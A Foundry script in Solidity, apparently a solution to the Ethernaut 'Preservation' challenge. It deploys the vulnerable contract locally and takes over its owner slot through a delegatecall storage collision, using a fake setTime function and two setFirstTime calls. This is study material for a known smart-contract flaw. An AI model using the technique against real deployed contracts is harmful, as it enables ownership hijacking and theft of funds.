// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Preservation.sol";

contract PreservationHack is Script {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    Preservation public preservation;

    address public constant eoa = address(1024);

    function run() public {
        LibraryContract timezone1 = new LibraryContract();
        LibraryContract timezone2 = new LibraryContract();
        preservation = new Preservation(address(timezone1), address(timezone2));

        console.log("Before:", preservation.owner());
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(eoa)));

        console.log("After:", preservation.owner());
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }
}
